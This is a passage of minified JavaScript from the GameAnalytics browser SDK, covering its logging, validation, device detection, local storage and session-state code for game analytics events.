"+t;e.instance.sendNotificationMessage(i,n.Warning)},e.e=function(t){var i="Error/"+e.Tag+": "+t;e.instance.sendNotificationMessage(i,n.Error)},e.ii=function(t){if(e.instance.infoLogVerboseEnabled){var i="Verbose/"+e.Tag+": "+t;e.instance.sendNotificationMessage(i,n.Info)}},e.d=function(t){if(e.debugEnabled){var i="Debug/"+e.Tag+": "+t;e.instance.sendNotificationMessage(i,n.Debug)}},e.prototype.sendNotificationMessage=function(e,t){switch(t){case n.Error:console.error(e);break;case n.Warning:console.warn(e);break;case n.Debug:"function"==typeof console.debug?console.debug(e):console.log(e);break;case n.Info:console.log(e)}},e}();t.instance=new t,t.Tag="GameAnalytics",e.GALogger=t}(e.logging||(e.logging={}))}(gameanalytics||(gameanalytics={}));var gameanalytics;!function(e){!function(n){var t=e.logging.GALogger,i=function(){function e(){}return e.getHmac=function(e,n){var t=CryptoJS.HmacSHA256(n,e);return CryptoJS.enc.Base64.stringify(t)},e.stringMatch=function(e,n){return!(!e||!n)&&n.test(e)},e.joinStringArray=function(e,n){for(var t="",i=0,r=e.length;i<r;i++)i>0&&(t+=n),t+=e[i];return t},e.stringArrayContainsString=function(e,n){if(0===e.length)return!1;for(var t in e)if(e[t]===n)return!0;return!1},e.encode64=function(n){n=encodeURI(n);var t,i,r,s,o,a="",u=0,c=0,d=0;do{t=n.charCodeAt(d++),i=n.charCodeAt(d++),u=n.charCodeAt(d++),r=t>>2,s=(3&t)<<4|i>>4,o=(15&i)<<2|u>>6,c=63&u,isNaN(i)?o=c=64:isNaN(u)&&(c=64),a=a+e.keyStr.charAt(r)+e.keyStr.charAt(s)+e.keyStr.charAt(o)+e.keyStr.charAt(c),t=i=u=0,r=s=o=c=0}while(d<n.length);return a},e.decode64=function(n){var i,r,s,o,a,u="",c=0,d=0,l=0;/[^A-Za-z0-9\+\/\=]/g.exec(n)&&t.w("There were invalid base64 characters in the input text. Valid base64 characters are A-Z, a-z, 0-9, '+', '/',and '='. Expect errors in decoding."),n=n.replace(/[^A-Za-z0-9\+\/\=]/g,"");do{s=e.keyStr.indexOf(n.charAt(l++)),o=e.keyStr.indexOf(n.charAt(l++)),a=e.keyStr.indexOf(n.charAt(l++)),d=e.keyStr.indexOf(n.charAt(l++)),i=s<<2|o>>4,r=(15&o)<<4|a>>2,c=(3&a)<<6|d,u+=String.fromCharCode(i),64!=a&&(u+=String.fromCharCode(r)),64!=d&&(u+=String.fromCharCode(c)),i=r=c=0,s=o=a=d=0}while(l<n.length);return decodeURI(u)},e.timeIntervalSince1970=function(){var e=new Date;return Math.round(e.getTime()/1e3)},e.createGuid=function(){return(e.s4()+e.s4()+"-"+e.s4()+"-4"+e.s4().substr(0,3)+"-"+e.s4()+"-"+e.s4()+e.s4()+e.s4()).toLowerCase()},e.s4=function(){return(65536*(1+Math.random())|0).toString(16).substring(1)},e}();i.keyStr="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",n.GAUtilities=i}(e.utilities||(e.utilities={}))}(gameanalytics||(gameanalytics={}));var gameanalytics;!function(e){!function(n){var t=e.logging.GALogger,i=e.http.EGASdkErrorType,r=e.utilities.GAUtilities,s=function(){function n(){}return n.validateBusinessEvent=function(e,i,r,s,o){return n.validateCurrency(e)?n.validateShortString(r,!0)?n.validateEventPartLength(s,!1)?n.validateEventPartCharacters(s)?n.validateEventPartLength(o,!1)?!!n.validateEventPartCharacters(o)||(t.i("Validation fail - business event - itemId: Cannot contain other characters than A-z, 0-9, -_., ()!?. String: "+o),!1):(t.i("Validation fail - business event - itemId. Cannot be (null), empty or above 64 characters. String: "+o),!1):(t.i("Validation fail - business event - itemType: Cannot contain other characters than A-z, 0-9, -_., ()!?. String: "+s),!1):(t.i("Validation fail - business event - itemType: Cannot be (null), empty or above 64 characters. String: "+s),!1):(t.i("Validation fail - business event - cartType. Cannot be above 32 length. String: "+r),!1):(t.i("Validation fail - business event - currency: Cannot be (null) and need to be A-Z, 3 characters and in the standard at openexchangerates.org. Failed currency: "+e),!1)},n.validateResourceEvent=function(i,s,o,a,u,c,d){return i==e.EGAResourceFlowType.Undefined?(t.i("Validation fail - resource event - flowType: Invalid flow type."),!1):s?r.stringArrayContainsString(c,s)?o>0?a?n.validateEventPartLength(a,!1)?n.validateEventPartCharacters(a)?r.stringArrayContainsString(d,a)?n.validateEventPartLength(u,!1)?!!n.validateEventPartCharacters(u)||(t.i("Validation fail - resource event - itemId: Cannot contain other characters than A-z, 0-9, -_., ()!?. String: "+u),!1):(t.i("Validation fail - resource event - itemId: Cannot be (null), empty or above 64 characters. String: "+u),!1):(t.i("Validation fail - resource event - itemType: Not found in list of pre-defined available resource itemTypes. String: "+a),!1):(t.i("Validation fail - resource event - itemType: Cannot contain other characters than A-z, 0-9, -_., ()!?. String: "+a),!1):(t.i("Validation fail - resource event - itemType: Cannot be (null), empty or above 64 characters. String: "+a),!1):(t.i("Validation fail - resource event - itemType: Cannot be (null)"),!1):(t.i("Validation fail - resource event - amount: Float amount cannot be 0 or negative. Value: "+o),!1):(t.i("Validation fail - resource event - currency: Not found in list of pre-defined available resource currencies. String: "+s),!1):(t.i("Validation fail - resource event - currency: Cannot be (null)"),!1)},n.validateProgressionEvent=function(i,r,s,o){if(i==e.EGAProgressionStatus.Undefined)return t.i("Validation fail - progression event: Invalid progression status."),!1;if(o&&!s&&r)return t.i("Validation fail - progression event: 03 found but 01+02 are invalid. Progression must be set as either 01, 01+02 or 01+02+03."),!1;if(s&&!r)return t.i("Validation fail - progression event: 02 found but not 01. Progression must be set as either 01, 01+02 or 01+02+03"),!1;if(!r)return t.i("Validation fail - progression event: progression01 not valid. Progressions must be set as either 01, 01+02 or 01+02+03"),!1;if(!n.validateEventPartLength(r,!1))return t.i("Validation fail - progression event - progression01: Cannot be (null), empty or above 64 characters. String: "+r),!1;if(!n.validateEventPartCharacters(r))return t.i("Validation fail - progression event - progression01: Cannot contain other characters than A-z, 0-9, -_., ()!?. String: "+r),!1;if(s){if(!n.validateEventPartLength(s,!0))return t.i("Validation fail - progression event - progression02: Cannot be empty or above 64 characters. String: "+s),!1;if(!n.validateEventPartCharacters(s))return t.i("Validation fail - progression event - progression02: Cannot contain other characters than A-z, 0-9, -_., ()!?. String: "+s),!1}if(o){if(!n.validateEventPartLength(o,!0))return t.i("Validation fail - progression event - progression03: Cannot be empty or above 64 characters. String: "+o),!1;if(!n.validateEventPartCharacters(o))return t.i("Validation fail - progression event - progression03: Cannot contain other characters than A-z, 0-9, -_., ()!?. String: "+o),!1}return!0},n.validateDesignEvent=function(e,i){return n.validateEventIdLength(e)?!!n.validateEventIdCharacters(e)||(t.i("Validation fail - design event - eventId: Non valid characters. Only allowed A-z, 0-9, -_., ()!?. String: "+e),!1):(t.i("Validation fail - design event - eventId: Cannot be (null) or empty. Only 5 event parts allowed seperated by :. Each part need to be 32 characters or less. String: "+e),!1)},n.validateErrorEvent=function(i,r){return i==e.EGAErrorSeverity.Undefined?(t.i("Validation fail - error event - severity: Severity was unsupported value."),!1):!!n.validateLongString(r,!0)||(t.i("Validation fail - error event - message: Message cannot be above 8192 characters."),!1)},n.validateSdkErrorEvent=function(e,r,s){return!!n.validateKeys(e,r)&&(s!==i.Undefined||(t.i("Validation fail - sdk error event - type: Type was unsupported value."),!1))},n.validateKeys=function(e,n){return!(!r.stringMatch(e,/^[A-z0-9]{32}$/)||!r.stringMatch(n,/^[A-z0-9]{40}$/))},n.validateCurrency=function(e){return!!e&&!!r.stringMatch(e,/^[A-Z]{3}$/)},n.validateEventPartLength=function(e,n){return!(!n||e)||!!e&&!(e.length>64)},n.validateEventPartCharacters=function(e){return!!r.stringMatch(e,/^[A-Za-z0-9\s\-_\.\(\)\!\?]{1,64}$/)},n.validateEventIdLength=function(e){return!!e&&!!r.stringMatch(e,/^[^:]{1,64}(?::[^:]{1,64}){0,4}$/)},n.validateEventIdCharacters=function(e){return!!e&&!!r.stringMatch(e,/^[A-Za-z0-9\s\-_\.\(\)\!\?]{1,64}(:[A-Za-z0-9\s\-_\.\(\)\!\?]{1,64}){0,4}$/)},n.validateAndCleanInitRequestResponse=function(e){if(null==e)return t.w("validateInitRequestResponse failed - no response dictionary."),null;var n={};try{n.enabled=e.enabled}catch(e){return t.w("validateInitRequestResponse failed - invalid type in 'enabled' field."),null}try{var i=e.server_ts;if(!(i>0))return t.w("validateInitRequestResponse failed - invalid value in 'server_ts' field."),null;n.server_ts=i}catch(n){return t.w("validateInitRequestResponse failed - invalid type in 'server_ts' field. type="+typeof e.server_ts+", value="+e.server_ts+", "+n),null}return n},n.validateBuild=function(e){return!!n.validateShortString(e,!1)},n.validateSdkWrapperVersion=function(e){return!!r.stringMatch(e,/^(unity|unreal|gamemaker|cocos2d|construct|defold) [0-9]{0,5}(\.[0-9]{0,5}){0,2}$/)},n.validateEngineVersion=function(e){return!(!e||!r.stringMatch(e,/^(unity|unreal|gamemaker|cocos2d|construct|defold) [0-9]{0,5}(\.[0-9]{0,5}){0,2}$/))},n.validateUserId=function(e){return!!n.validateString(e,!1)||(t.i("Validation fail - user id: id cannot be (null), empty or above 64 characters."),!1)},n.validateShortString=function(e,n){return!(!n||e)||!(!e||e.length>32)},n.validateString=function(e,n){return!(!n||e)||!(!e||e.length>64)},n.validateLongString=function(e,n){return!(!n||e)||!(!e||e.length>8192)},n.validateConnectionType=function(e){return r.stringMatch(e,/^(wwan|wifi|lan|offline)$/)},n.validateCustomDimensions=function(e){return n.validateArrayOfStrings(20,32,!1,"custom dimensions",e)},n.validateResourceCurrencies=function(e){if(!n.validateArrayOfStrings(20,64,!1,"resource currencies",e))return!1;for(var i=0;i<e.length;++i)if(!r.stringMatch(e[i],/^[A-Za-z]+$/))return t.i("resource currencies validation failed: a resource currency can only be A-Z, a-z. String was: "+e[i]),!1;return!0},n.validateResourceItemTypes=function(e){if(!n.validateArrayOfStrings(20,32,!1,"resource item types",e))return!1;for(var i=0;i<e.length;++i)if(!n.validateEventPartCharacters(e[i]))return t.i("resource item types validation failed: a resource item type cannot contain other characters than A-z, 0-9, -_., ()!?. String was: "+e[i]),!1;return!0},n.validateDimension01=function(e,n){return!e||!!r.stringArrayContainsString(n,e)},n.validateDimension02=function(e,n){return!e||!!r.stringArrayContainsString(n,e)},n.validateDimension03=function(e,n){return!e||!!r.stringArrayContainsString(n,e)},n.validateArrayOfStrings=function(e,n,i,r,s){var o=r;if(o||(o="Array"),!s)return t.i(o+" validation failed: array cannot be null. "),!1;if(0==i&&0==s.length)return t.i(o+" validation failed: array cannot be empty. "),!1;if(e>0&&s.length>e)return t.i(o+" validation failed: array cannot exceed "+e+" values. It has "+s.length+" values."),!1;for(var a=0;a<s.length;++a){var u=s[a]?s[a].length:0;if(0===u)return t.i(o+" validation failed: contained an empty string. Array="+JSON.stringify(s)),!1;if(n>0&&u>n)return t.i(o+" validation failed: a string exceeded max allowed length (which is: "+n+"). String was: "+s[a]),!1}return!0},n.validateFacebookId=function(e){return!!n.validateString(e,!1)||(t.i("Validation fail - facebook id: id cannot be (null), empty or above 64 characters."),!1)},n.validateGender=function(n){if(isNaN(Number(e.EGAGender[n]))){if(n==e.EGAGender.Undefined||n!=e.EGAGender.Male&&n!=e.EGAGender.Female)return t.i("Validation fail - gender: Has to be 'male' or 'female'. Was: "+n),!1}else if(n==e.EGAGender[e.EGAGender.Undefined]||n!=e.EGAGender[e.EGAGender.Male]&&n!=e.EGAGender[e.EGAGender.Female])return t.i("Validation fail - gender: Has to be 'male' or 'female'. Was: "+n),!1;return!0},n.validateBirthyear=function(e){return!(e<0||e>9999)||(t.i("Validation fail - birthYear: Cannot be (null) or invalid range."),!1)},n.validateClientTs=function(e){return!(e<-4294967294||e>4294967294)},n}();n.GAValidator=s}(e.validators||(e.validators={}))}(gameanalytics||(gameanalytics={}));var gameanalytics;!function(e){!function(e){var n=function(){function e(e,n,t){this.name=e,this.value=n,this.version=t}return e}();e.NameValueVersion=n;var t=function(){function e(e,n){this.name=e,this.version=n}return e}();e.NameVersion=t;var i=function(){function e(){}return e.touch=function(){},e.getRelevantSdkVersion=function(){return e.sdkGameEngineVersion?e.sdkGameEngineVersion:e.sdkWrapperVersion},e.getConnectionType=function(){return e.connectionType},e.updateConnectionType=function(){navigator.onLine?"ios"===e.buildPlatform||"android"===e.buildPlatform?e.connectionType="wwan":e.connectionType="lan":e.connectionType="offline"},e.getOSVersionString=function(){return e.buildPlatform+" "+e.osVersionPair.version},e.runtimePlatformToString=function(){return e.osVersionPair.name},e.getBrowserVersionString=function(){var e,n=navigator.userAgent,t=n.match(/(opera|chrome|safari|firefox|ubrowser|msie|trident|fbav(?=\/))\/?\s*(\d+)/i)||[];if(/trident/i.test(t[1]))return e=/\brv[ :]+(\d+)/g.exec(n)||[],"IE "+(e[1]||"");if("Chrome"===t[1]&&null!=(e=n.match(/\b(OPR|Edge|UBrowser)\/(\d+)/)))return e.slice(1).join(" ").replace("OPR","Opera").replace("UBrowser","UC").toLowerCase();if("fbav"===t[1].toLowerCase()&&(t[1]="facebook",t[2]))return"facebook "+t[2];var i=t[2]?[t[1],t[2]]:[navigator.appName,navigator.appVersion,"-?"];return null!=(e=n.match(/version\/(\d+)/i))&&i.splice(1,1,e[1]),i.join(" ").toLowerCase()},e.getDeviceModel=function(){return"unknown"},e.getDeviceManufacturer=function(){return"unknown"},e.matchItem=function(e,n){var i,r,s,o,a,u=new t("unknown","0.0.0"),c=0,d=0;for(c=0;c<n.length;c+=1)if(i=new RegExp(n[c].value,"i"),i.test(e)){if(r=new RegExp(n[c].version+"[- /:;]([\\d._]+)","i"),s=e.match(r),a="",s&&s[1]&&(o=s[1]),o){var l=o.split(/[._]+/);for(d=0;d<Math.min(l.length,3);d+=1)a+=l[d]+(d<Math.min(l.length,3)-1?".":"")}else a="0.0.0";return u.name=n[c].name,u.version=a,u}return u},e}();i.sdkWrapperVersion="javascript 2.1.2",i.osVersionPair=i.matchItem([navigator.platform,navigator.userAgent,navigator.appVersion,navigator.vendor,window.opera].join(" "),[new n("windows_phone","Windows Phone","OS"),new n("windows","Win","NT"),new n("ios","iPhone","OS"),new n("ios","iPad","OS"),new n("ios","iPod","OS"),new n("android","Android","Android"),new n("blackBerry","BlackBerry","/"),new n("mac_osx","Mac","OS X"),new n("tizen","Tizen","Tizen"),new n("linux","Linux","rv")]),i.buildPlatform=i.runtimePlatformToString(),i.deviceModel=i.getDeviceModel(),i.deviceManufacturer=i.getDeviceManufacturer(),i.osVersion=i.getOSVersionString(),i.browserVersion=i.getBrowserVersionString(),i.maxSafeInteger=Math.pow(2,53)-1,e.GADevice=i}(e.device||(e.device={}))}(gameanalytics||(gameanalytics={}));var gameanalytics;!function(e){!function(e){var n=function(){function e(n){this.deadline=n,this.ignore=!1,this.async=!1,this.running=!1,this.id=++e.idCounter}return e}();n.idCounter=0,e.TimedBlock=n}(e.threading||(e.threading={}))}(gameanalytics||(gameanalytics={}));var gameanalytics;!function(e){!function(e){var n=function(){function e(e){this.comparer=e,this._subQueues={},this._sortedKeys=[]}return e.prototype.enqueue=function(e,n){-1===this._sortedKeys.indexOf(e)&&this.addQueueOfPriority(e),this._subQueues[e].push(n)},e.prototype.addQueueOfPriority=function(e){var n=this;this._sortedKeys.push(e),this._sortedKeys.sort(function(e,t){return n.comparer.compare(e,t)}),this._subQueues[e]=[]},e.prototype.peek=function(){if(this.hasItems())return this._subQueues[this._sortedKeys[0]][0];throw new Error("The queue is empty")},e.prototype.hasItems=function(){return this._sortedKeys.length>0},e.prototype.dequeue=function(){if(this.hasItems())return this.dequeueFromHighPriorityQueue();throw new Error("The queue is empty")},e.prototype.dequeueFromHighPriorityQueue=function(){var e=this._sortedKeys[0],n=this._subQueues[e].shift();return 0===this._subQueues[e].length&&(this._sortedKeys.shift(),delete this._subQueues[e]),n},e}();e.PriorityQueue=n}(e.threading||(e.threading={}))}(gameanalytics||(gameanalytics={}));var gameanalytics;!function(e){!function(n){var t,i=e.logging.GALogger;!function(e){e[e.Equal=0]="Equal",e[e.LessOrEqual=1]="LessOrEqual",e[e.NotEqual=2]="NotEqual"}(t=n.EGAStoreArgsOperator||(n.EGAStoreArgsOperator={}));var r;!function(e){e[e.Events=0]="Events",e[e.Sessions=1]="Sessions",e[e.Progression=2]="Progression"}(r=n.EGAStore||(n.EGAStore={}));var s=function(){function e(){this.eventsStore=[],this.sessionsStore=[],this.progressionStore=[],this.storeItems={};try{"object"==typeof localStorage?(localStorage.setItem("testingLocalStorage","yes"),localStorage.removeItem("testingLocalStorage"),e.storageAvailable=!0):e.storageAvailable=!1}catch(e){}}return e.isStorageAvailable=function(){return e.storageAvailable},e.isStoreTooLargeForEvents=function(){return e.instance.eventsStore.length+e.instance.sessionsStore.length>e.MaxNumberOfEntries},e.select=function(n,i,r,s){void 0===i&&(i=[]),void 0===r&&(r=!1),void 0===s&&(s=0);var o=e.getStore(n);if(!o)return null;for(var a=[],u=0;u<o.length;++u){for(var c=o[u],d=!0,l=0;l<i.length;++l){var f=i[l];if(c[f[0]])switch(f[1]){case t.Equal:d=c[f[0]]==f[2];break;case t.LessOrEqual:d=c[f[0]]<=f[2];break;case t.NotEqual:d=c[f[0]]!=f[2];break;default:d=!1}else d=!1;if(!d)break}d&&a.push(c)}return r&&a.sort(function(e,n){return e.client_ts-n.client_ts}),s>0&&a.length>s&&(a=a.slice(0,s+1)),a},e.update=function(n,i,r){void 0===r&&(r=[]);var s=e.getStore(n);if(!s)return!1;for(var o=0;o<s.length;++o){for(var a=s[o],u=!0,c=0;c<r.length;++c){var d=r[c];if(a[d[0]])switch(d[1]){case t.Equal:u=a[d[0]]==d[2];break;case t.LessOrEqual:u=a[d[0]]<=d[2];break;case t.NotEqual:u=a[d[0]]!=d[2];break;default:u=!1}else u=!1;if(!u)break}if(u)for(var c=0;c<i.length;++c){var l=i[c];a[l[0]]=l[1]}}return!0},e.delete=function(n,i){var r=e.getStore(n);if(r)for(var s=0;s<r.length;++s){for(var o=r[s],a=!0,u=0;u<i.length;++u){var c=i[u];if(o[c[0]])switch(c[1]){case t.Equal:a=o[c[0]]==c[2];break;case t.LessOrEqual:a=o[c[0]]<=c[2];break;case t.NotEqual:a=o[c[0]]!=c[2];break;default:a=!1}else a=!1;if(!a)break}a&&(r.splice(s,1),--s)}},e.insert=function(n,t,i,r){void 0===i&&(i=!1),void 0===r&&(r=null);var s=e.getStore(n);if(s)if(i){if(!r)return;for(var o=!1,a=0;a<s.length;++a){var u=s[a];if(u[r]==t[r]){for(var c in t)u[c]=t[c];o=!0;break}}o||s.push(t)}else s.push(t)},e.save=function(){if(!e.isStorageAvailable())return void i.w("Storage is not available, cannot save.");localStorage.setItem(e.KeyPrefix+e.EventsStoreKey,JSON.stringify(e.instance.eventsStore)),localStorage.setItem(e.KeyPrefix+e.SessionsStoreKey,JSON.stringify(e.instance.sessionsStore)),localStorage.setItem(e.KeyPrefix+e.ProgressionStoreKey,JSON.stringify(e.instance.progressionStore)),localStorage.setItem(e.KeyPrefix+e.ItemsStoreKey,JSON.stringify(e.instance.storeItems))},e.load=function(){if(!e.isStorageAvailable())return void i.w("Storage is not available, cannot load.");try{e.instance.eventsStore=JSON.parse(localStorage.getItem(e.KeyPrefix+e.EventsStoreKey)),e.instance.eventsStore||(e.instance.eventsStore=[])}catch(n){i.w("Load failed for 'events' store. Using empty store."),e.instance.eventsStore=[]}try{e.instance.sessionsStore=JSON.parse(localStorage.getItem(e.KeyPrefix+e.SessionsStoreKey)),e.instance.sessionsStore||(e.instance.sessionsStore=[])}catch(n){i.w("Load failed for 'sessions' store. Using empty store."),e.instance.sessionsStore=[]}try{e.instance.progressionStore=JSON.parse(localStorage.getItem(e.KeyPrefix+e.ProgressionStoreKey)),e.instance.progressionStore||(e.instance.progressionStore=[])}catch(n){i.w("Load failed for 'progression' store. Using empty store."),e.instance.progressionStore=[]}try{e.instance.storeItems=JSON.parse(localStorage.getItem(e.KeyPrefix+e.ItemsStoreKey)),e.instance.storeItems||(e.instance.storeItems={})}catch(n){i.w("Load failed for 'items' store. Using empty store."),e.instance.progressionStore=[]}},e.setItem=function(n,t){var i=e.KeyPrefix+n;t?e.instance.storeItems[i]=t:i in e.instance.storeItems&&delete e.instance.storeItems[i]},e.getItem=function(n){var t=e.KeyPrefix+n;return t in e.instance.storeItems?e.instance.storeItems[t]:null},e.getStore=function(n){switch(n){case r.Events:return e.instance.eventsStore;case r.Sessions:return e.instance.sessionsStore;case r.Progression:return e.instance.progressionStore;default:return i.w("GAStore.getStore(): Cannot find store: "+n),null}},e}();s.instance=new s,s.MaxNumberOfEntries=2e3,s.KeyPrefix="GA::",s.EventsStoreKey="ga_event",s.SessionsStoreKey="ga_session",s.ProgressionStoreKey="ga_progression",s.ItemsStoreKey="ga_items",n.GAStore=s}(e.store||(e.store={}))}(gameanalytics||(gameanalytics={}));var gameanalytics;!function(e){!function(n){var t=e.validators.GAValidator,i=e.utilities.GAUtilities,r=e.logging.GALogger,s=e.store.GAStore,o=e.device.GADevice,a=e.store.EGAStore,u=e.store.EGAStoreArgsOperator,c=function(){function n(){this.availableCustomDimensions01=[],this.availableCustomDimensions02=[],this.availableCustomDimensions03=[],this.availableResourceCurrencies=[],this.availableResourceItemTypes=[],this.sdkConfigDefault={},this.sdkConfig={},this.progressionTries={}}return n.setUserId=function(e){n.instance.userId=e,n.cacheIdentifier()},n.getIdentifier=function(){return n.instance.identifier},n.isInitialized=function(){return n.instance.initialized},n.setInitialized=function(e){n.instance.initialized=e},n.getSessionStart=function(){return n.instance.sessionStart},n.getSessionNum=function(){return n.instance.sessionNum},n.getTransactionNum=function(){return n.instance.transactionNum},n.getSessionId=function(){return n.instance.sessionId},n.getCurrentCustomDimension01=function(){return n.instance.currentCustomDimension01},n.getCurrentCustomDimension02=function(){return n.instance.currentCustomDimension02},n.getCurrentCustomDimension03=function(){return n.instance.currentCustomDimension03},n.getGameKey=function(){return n.instance.gameKey},n.getGameSecret=function(){return n.instance.gameSecret},n.getAvailableCustomDimensions01=function(){return n.instance.availableCustomDimensions01},n.setAvailableCustomDimensions01=function(e){t.validateCustomDimensions(e)&&(n.instance.availableCustomDimensions01=e,n.validateAndFixCurrentDimensions(),r.i("Set available custom01 dimension values: ("+i.joinStringArray(e,", ")+")"))},n.getAvailableCustomDimensions02=function(){return n.instance.availableCustomDimensions02},n.setAvailableCustomDimensions02=function(e){t.validateCustomDimensions(e)&&(n.instance.availableCustomDimensions02=e,n.validateAndFixCurrentDimensions(),r.i("Set available custom02 dimension values: ("+i.joinStringArray(e,", ")+")"))},n.getAvailableCustomDimensions03=function(){return n.instance.availableCustomDimensions03},n.setAvailableCustomDimensions03=function(e){t.validateCustomDimensions(e)&&(n.instance.availableCustomDimensions03=e,n.validateAndFixCurrentDimensions(),r.i("Set available custom03 dimension values: ("+i.joinStringArray(e,", ")+")"))},n.getAvailableResourceCurrencies=function(){return n.instance.availableResourceCurrencies},n.setAvailableResourceCurrencies=function(e){t.validateResourceCurrencies(e)&&(n.instance.availableResourceCurrencies=e,r.i("Set available resource currencies: ("+i.joinStringArray(e,", ")+")"))},n.getAvailableResourceItemTypes=function(){return n.instance.availableResourceItemTypes},n.setAvailableResourceItemTypes=function(e){t.validateResourceItemTypes(e)&&(n.instance.availableResourceItemTypes=e,r.i("Set available resource item types: ("+i.joinStringArray(e,", ")+")"))},n.getBuild=function(){return n.instance.build},n.setBuild=function(e){n.instance.build=e,r.i("Set build version: "+e)},n.getUseManualSessionHandling=function(){return n.instance.useManualSessionHandling},n.prototype.setDefaultId=function(e){this.defaultUserId=e||"",n.cacheIdentifier()},n.getDefaultId=function(){return n.instance.defaultUserId},n.getSdkConfig=function(){var e,t=0;for(var i in n.instance.sdkConfig)0===t&&(e=i),++t;if(e&&t>0)return n.instance.sdkConfig;var e,t=0;for(var i in n.instance.sdkConfigCached)0===t&&(e=i),++t
;return e&&t>0?n.instance.sdkConfigCached:n.instance.sdkConfigDefault},n.isEnabled=function(){var e=n.getSdkConfig();return(!e.enabled||"false"!=e.enabled)&&!!n.instance.initAuthorized},n.setCustomDimension01=function(e){n.instance.currentCustomDimension01=e,s.setItem(n.Dimension01Key,e),r.i("Set custom01 dimension value: "+e)},n.setCustomDimension02=function(e){n.instance.currentCustomDimension02=e,s.setItem(n.Dimension02Key,e),r.i("Set custom02 dimension value: "+e)},n.setCustomDimension03=function(e){n.instance.currentCustomDimension03=e,s.setItem(n.Dimension03Key,e),r.i("Set custom03 dimension value: "+e)},n.setFacebookId=function(e){n.instance.facebookId=e,s.setItem(n.FacebookIdKey,e),r.i("Set facebook id: "+e)},n.setGender=function(t){n.instance.gender=isNaN(Number(e.EGAGender[t]))?e.EGAGender[t].toString().toLowerCase():e.EGAGender[e.EGAGender[t]].toString().toLowerCase(),s.setItem(n.GenderKey,n.instance.gender),r.i("Set gender: "+n.instance.gender)},n.setBirthYear=function(e){n.instance.birthYear=e,s.setItem(n.BirthYearKey,e.toString()),r.i("Set birth year: "+e)},n.incrementSessionNum=function(){var e=n.getSessionNum()+1;n.instance.sessionNum=e},n.incrementTransactionNum=function(){var e=n.getTransactionNum()+1;n.instance.transactionNum=e},n.incrementProgressionTries=function(e){var t=n.getProgressionTries(e)+1;n.instance.progressionTries[e]=t;var i={};i.progression=e,i.tries=t,s.insert(a.Progression,i,!0,"progression")},n.getProgressionTries=function(e){return e in n.instance.progressionTries?n.instance.progressionTries[e]:0},n.clearProgressionTries=function(e){e in n.instance.progressionTries&&delete n.instance.progressionTries[e];var t=[];t.push(["progression",u.Equal,e]),s.delete(a.Progression,t)},n.setKeys=function(e,t){n.instance.gameKey=e,n.instance.gameSecret=t},n.setManualSessionHandling=function(e){n.instance.useManualSessionHandling=e,r.i("Use manual session handling: "+e)},n.getEventAnnotations=function(){var e={};e.v=2,e.user_id=n.instance.identifier,e.client_ts=n.getClientTsAdjusted(),e.sdk_version=o.getRelevantSdkVersion(),e.os_version=o.osVersion,e.manufacturer=o.deviceManufacturer,e.device=o.deviceModel,e.browser_version=o.browserVersion,e.platform=o.buildPlatform,e.session_id=n.instance.sessionId,e[n.SessionNumKey]=n.instance.sessionNum;var i=o.getConnectionType();return t.validateConnectionType(i)&&(e.connection_type=i),o.gameEngineVersion&&(e.engine_version=o.gameEngineVersion),n.instance.build&&(e.build=n.instance.build),n.instance.facebookId&&(e[n.FacebookIdKey]=n.instance.facebookId),n.instance.gender&&(e[n.GenderKey]=n.instance.gender),0!=n.instance.birthYear&&(e[n.BirthYearKey]=n.instance.birthYear),e},n.getSdkErrorEventAnnotations=function(){var e={};e.v=2,e.category=n.CategorySdkError,e.sdk_version=o.getRelevantSdkVersion(),e.os_version=o.osVersion,e.manufacturer=o.deviceManufacturer,e.device=o.deviceModel,e.platform=o.buildPlatform;var i=o.getConnectionType();return t.validateConnectionType(i)&&(e.connection_type=i),o.gameEngineVersion&&(e.engine_version=o.gameEngineVersion),e},n.getInitAnnotations=function(){var e={};return e.sdk_version=o.getRelevantSdkVersion(),e.os_version=o.osVersion,e.platform=o.buildPlatform,e},n.getClientTsAdjusted=function(){var e=i.timeIntervalSince1970(),r=e+n.instance.clientServerTimeOffset;return t.validateClientTs(r)?r:e},n.sessionIsStarted=function(){return 0!=n.instance.sessionStart},n.cacheIdentifier=function(){n.instance.userId?n.instance.identifier=n.instance.userId:n.instance.defaultUserId&&(n.instance.identifier=n.instance.defaultUserId)},n.ensurePersistedStates=function(){s.isStorageAvailable()&&s.load();var e=n.instance;e.setDefaultId(null!=s.getItem(n.DefaultUserIdKey)?s.getItem(n.DefaultUserIdKey):i.createGuid()),e.sessionNum=null!=s.getItem(n.SessionNumKey)?Number(s.getItem(n.SessionNumKey)):0,e.transactionNum=null!=s.getItem(n.TransactionNumKey)?Number(s.getItem(n.TransactionNumKey)):0,e.facebookId?s.setItem(n.FacebookIdKey,e.facebookId):(e.facebookId=null!=s.getItem(n.FacebookIdKey)?s.getItem(n.FacebookIdKey):"",e.facebookId),e.gender?s.setItem(n.GenderKey,e.gender):(e.gender=null!=s.getItem(n.GenderKey)?s.getItem(n.GenderKey):"",e.gender),e.birthYear&&0!=e.birthYear?s.setItem(n.BirthYearKey,e.birthYear.toString()):(e.birthYear=null!=s.getItem(n.BirthYearKey)?Number(s.getItem(n.BirthYearKey)):0,e.birthYear),e.currentCustomDimension01?s.setItem(n.Dimension01Key,e.currentCustomDimension01):(e.currentCustomDimension01=null!=s.getItem(n.Dimension01Key)?s.getItem(n.Dimension01Key):"",e.currentCustomDimension01),e.currentCustomDimension02?s.setItem(n.Dimension02Key,e.currentCustomDimension02):(e.currentCustomDimension02=null!=s.getItem(n.Dimension02Key)?s.getItem(n.Dimension02Key):"",e.currentCustomDimension02),e.currentCustomDimension03?s.setItem(n.Dimension03Key,e.currentCustomDimension03):(e.currentCustomDimension03=null!=s.getItem(n.Dimension03Key)?s.getItem(n.Dimension03Key):"",e.currentCustomDimension03);var t=null!=s.getItem(n.SdkConfigCachedKey)?s.getItem(n.SdkConfigCachedKey):"";if(t){var r=JSON.parse(i.decode64(t));r&&(e.sdkConfigCached=r)}var o=s.select(a.Progression);if(o)for(var u=0;u<o.length;++u){var c=o[u];c&&(e.progressionTries[c.progression]=c.tries)}},n.calculateServerTimeOffset=function(e){return 